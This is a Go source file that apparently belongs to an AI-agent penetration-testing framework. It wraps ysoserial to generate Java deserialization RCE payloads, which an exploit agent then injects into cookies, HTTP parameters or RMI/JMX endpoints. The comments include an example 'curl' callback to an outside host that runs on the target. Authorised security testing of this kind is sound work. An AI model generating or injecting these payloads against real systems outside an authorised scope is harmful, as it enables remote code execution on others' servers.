package tools

import (
	"context"
	"encoding/base64"
	"fmt"
	"strings"
	"time"

	"github.com/Armur-Ai/Pentest-Swarm-AI/internal/scope"
)

// YsoserialTool wraps frohoff/ysoserial (https://github.com/frohoff/ysoserial)
// for generating Java deserialization payloads. Unlike most adapters
// this one doesn't scan a target — it emits a serialized payload that
// the exploit agent then injects into a suspected sink (cookie value,
// HTTP parameter, RMI/JMX endpoint, etc.).
//
// "target" here is the **command to execute on the deserializing host**
// (e.g. `curl http://oast.fun/` for blind RCE confirmation). The
// adapter still scope-validates that command via the standard guard;
// callers should pass a benign OOB-style probe, not a destructive
// command. Safe-mode in the exploit executor will block destructive
// tokens regardless.
//
// Plan reference: 2.1.20 (P1) in IMPLEMENTATION_PLAN.md. Powers the
// deserialization specialization in 5.9.
type YsoserialTool struct{}

// NewYsoserialTool constructs the adapter.
func NewYsoserialTool() *YsoserialTool { return &YsoserialTool{} }

// Name implements Tool. Single word, lowercase, matches the binary.
func (y *YsoserialTool) Name() string { return "ysoserial" }

// IsAvailable checks that `ysoserial` is on PATH. Some distros ship
// it as a JAR (`ysoserial.jar`); we expect a wrapper script that
// invokes `java -jar` to provide the `ysoserial` command. Doctor will
// flag if it's missing.
func (y *YsoserialTool) IsAvailable() bool { return IsCommandAvailable("ysoserial") }

// Run generates a deserialization payload for the given gadget chain
// and command. `target` is the OS command to execute on the
// vulnerable host (passed to ysoserial as the final positional arg).
//
// Supported options:
//
//	timeout  int    — per-invocation timeout in seconds (default 30)
//	gadget   string — payload gadget chain (default "CommonsCollections5").
//	                  Common choices: CommonsBeanutils1, CommonsCollections1..7,
//	                  Spring1/2, Hibernate1/2, JRMPClient, ROME, URLDNS.
//	                  Pick based on classpath fingerprint from earlier recon.
//	encoding string — output encoding for the payload bytes:
//	                  "raw" (default; binary stdout), "base64", "hex".
//	                  "raw" is rarely useful from the swarm path because
//	                  the bytes can't survive JSON round-trip; "base64" is.
//
// The generated payload appears on stdout (raw or encoded). It is also
// returned as a single ParsedFinding so downstream agents can fetch it
// without re-parsing RawOutput.
func (y *YsoserialTool) Run(ctx context.Context, target string, opts Options) (*ToolResult, error) {
	if scopeDef := getScopeFromContext(ctx); scopeDef != nil {
		// We don't scope-validate the *gadget* (it's a class name); we
		// validate the embedded command in case it contains a URL the
		// scope guard would reject. ValidateAndLog accepts the target
		// string as-is; that's fine for an OOB URL like
		// "curl http://xyz.oast.fun/" since the guard checks against
		// allowed-domain rules.
		if err := scope.ValidateAndLog("ysoserial", target, *scopeDef); err != nil {
			return nil, fmt.Errorf("scope violation in ysoserial: %w", err)
		}
	}

	timeout := time.Duration(opts.GetInt("timeout", 30)) * time.Second
	gadget := opts.GetString("gadget", "CommonsCollections5")
	encoding := strings.ToLower(opts.GetString("encoding", "raw"))

	// Positional args only: `ysoserial <gadget> <command>`. No flags.
	result := RunToolCommand(ctx, "ysoserial", target, timeout, "ysoserial", gadget, target)
	if result.Error != nil {
		return result, result.Error
	}

	// Surface the payload as a single structured finding. RawOutput
	// holds the raw bytes; the encoded form below is what agents will
	// typically copy into payloads.
	payload := result.RawOutput
	switch encoding {
	case "base64":
		payload = base64.StdEncoding.EncodeToString([]byte(result.RawOutput))
	case "hex":
		var sb strings.Builder
		for _, b := range []byte(result.RawOutput) {
			fmt.Fprintf(&sb, "%02x", b)
		}
		payload = sb.String()
	}

	result.ParsedFindings = []map[string]any{{
		"tool":     "ysoserial",
		"gadget":   gadget,
		"command":  target,
		"encoding": encoding,
		"payload":  payload,
		"size":     len(result.RawOutput),
	}}

	return result, nil
}
